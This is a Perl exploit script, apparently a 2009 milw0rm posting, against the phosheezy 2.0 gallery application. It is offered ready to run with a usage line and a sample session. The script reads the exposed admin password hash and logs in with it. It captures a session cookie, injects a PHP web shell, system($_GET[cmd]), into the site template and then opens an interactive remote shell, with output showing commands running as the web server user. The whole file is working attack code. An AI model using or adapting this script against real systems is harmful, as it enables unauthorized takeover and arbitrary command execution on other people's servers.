<html><head><title>phosheezy 2.0 Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl

# phosheezy 2.0
# http://www.ryneezy.net/apps/phosheezy/phosheezy-v0.2.tar.gz
# Remote Command Execution Exploit
# by Osirys
# osirys[at]live[dot]it
# osirys.org
# Greets: HaVoC, x0r, jay, BlackLight
# lol at athos

# --------------------------------------------------------------
# Exploit in action :D
# --------------------------------------------------------------
# osirys[~]&gt;$ perl exp.txt http://localhost/phosheezy/
#
#   ----------------------------
#      Phosheezy RCE Exploit
#         Coded by Osirys
#   ----------------------------
#
# [+] Admin password found:
#     Sha1 pwd: 8942c747dc48c47a6f7f026df85a448046348a2c
# [+] Grabbing server headers to get a valid SESSION ID ..
# [+] SESSION ID grabbed: 3srqiuh8jrttt73tbd7j5uvhi2
# [+] Succesfully logged in as Administrator
# [+] Template edited, RCE Vulnerability Created !
# shell$&gt; id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell$&gt; exit
# [-] Quitting ..
# osirys[~]&gt;$
# --------------------------------------------------------------

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;

my $host       =  $ARGV[0];
my $pwd_path   =  &quot;/config/password&quot;;
my $adm_path   =  &quot;/admin.php&quot;;
my $templ_path =  &quot;/admin.php?action=3&quot;;

help(&quot;-1&quot;) unless ($host);
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;

$datas = get_data($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

my $url = $host.$pwd_path;
my $re = get_req($url);

if ($re =~ /([0-9a-f]{40})/) {
    $password = $1;
    print &quot;[+] Admin password found:\n&quot;;
    print &quot;    Sha1 pwd: $password  \n&quot;;
    adm_log($password);
}
else {
    print &quot;[-] Unable to get sha1 Admin password\n\n&quot;;
    exit(0);
}

sub adm_log() {
    my $password =  $_[0];
    my $link     =  $path.&quot;.&quot;.$adm_path;
    my $post     =  &quot;password=$password&amp;Login=Login&quot;;
    my $length   =  length($post);
    my @data;
    my $socket   =  new IO::Socket::INET(
                                          PeerAddr =&gt; $h0st,
                                          PeerPort =&gt; '80',
                                          Proto    =&gt; 'tcp',
                                        ) or die $!;

    my $data = &quot;POST &quot;.$link.&quot; HTTP/1.1\r\n&quot;.
               &quot;Host: &quot;.$h0st.&quot;\r\n&quot;.
               &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
               &quot;Content-Length: &quot;.$length.&quot;\r\n\r\n&quot;.
               $post.&quot;\r\n&quot;;

    $socket-&gt;send($data);
    print &quot;[+] Grabbing server headers to get a valid SESSION ID ..\n&quot;;

    while (my $e = &lt;$socket&gt;) {
        push(@data,$e);
    }
    foreach my $e(@data) {
        if ($e =~ /Welcome to Ryneezy PhoSheezy web administration/) {
            $log_ = 1;
            print &quot;[+] Succesfully logged in as Administrator\n&quot;;
        }
        elsif ($e =~ /Set-Cookie: PHPSESSID=([0-9a-z]{1,50});/) {
            $phpsessid = $1;
            print &quot;[+] SESSION ID grabbed: $phpsessid\n&quot;;
        }
    }

    (($log_)&amp;&amp;($phpsessid)) || die &quot;[-] Exploit failed -&gt; Login Failed or SESSION ID not grabbed!\n&quot;;
    RCE_create($phpsessid);
}

sub RCE_create() {
    my $phpsessid = $_[0];
    my $link     =  $path.&quot;.&quot;.$templ_path;
    my $code = &quot;header=&lt;html&gt;&lt;head&gt;&lt;title&gt;Ryneezy PhoSheezy&lt;/tit&quot;.
               &quot;le&gt;&lt;/head&gt;&lt;body bgcolor=\&quot;#ffffff\&quot; text=\&quot;#0000&quot;.
               &quot;00\&quot;&gt;&amp;footer=&lt;/body&gt;&lt;/html&gt;&lt;!-- cmd --&gt;&lt;?php sys&quot;.
               &quot;tem(\$_GET[cmd]);?&gt;&lt;!--cmd--&gt;&amp;Submit=Edit Layout&quot;;
    my $length =  length($code);

    my $socket = new IO::Socket::INET(
                                       PeerAddr =&gt; $h0st,
                                       PeerPort =&gt; '80',
                                       Proto    =&gt; 'tcp',
                                     ) or die $!;

    my $data = &quot;POST &quot;.$link.&quot; HTTP/1.1\r\n&quot;.
               &quot;Host: &quot;.$h0st.&quot;\r\n&quot;.
               &quot;Cookie: PHPSESSID=&quot;.$phpsessid.&quot;; hotlog=1\r\n&quot;.
               &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
               &quot;Content-Length: &quot;.$length.&quot;\r\n\r\n&quot;.
               &quot;$code\r\n&quot;;

    $socket-&gt;send($data);

    while (my $e = &lt;$socket&gt;) {
        if ($e =~ /Edit layout again/) {
            $rce_c = 1;
            print &quot;[+] Template edited, RCE Vulnerability Created !\n&quot;;
        }
    }

    $rce_c == 1 || die &quot;[-] Can't edit Template. Exploit failed\n\n&quot;;
    &amp;exec_cmd;
}

sub exec_cmd {
    print &quot;shell\$&gt; &quot;;
    $cmd = &lt;STDIN&gt;;
    $cmd !~ /exit/ || die &quot;[-] Quitting ..\n&quot;;
    $exec_url = ($host.&quot;/index.php?cmd=&quot;.$cmd);
    $re = get_req($exec_url);
    if ($re =~ /&lt;!-- cmd --&gt;(.*)/) {
        my $cmd = $1;
        $cmd =~ s/&lt;!--cmd--&gt;/[-] Undefined output or bad cmd !/;
        print &quot;$cmd\n&quot;;
        &amp;exec_cmd;
    }
    else {
        print &quot;[-] Undefined output or bad cmd !\n&quot;;
        &amp;exec_cmd;
    }
}

sub get_req() {
    $link   = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua  = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_data() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $h0st !~ /www/ || $h0st =~ s/www\.//;
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st.&quot; &quot;.$path;
    return $full_det;
}

sub banner {
    print &quot;\n&quot;.
          &quot;  ---------------------------- \n&quot;.
          &quot;     Phosheezy RCE Exploit     \n&quot;.
          &quot;        Coded by Osirys        \n&quot;.
          &quot;  ---------------------------- \n\n&quot;;
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Cheek that you provide a hostname address!\n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad hostname address !\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path\n\n&quot;;
    exit(0);
}

# milw0rm.com [2009-01-14]</pre></html>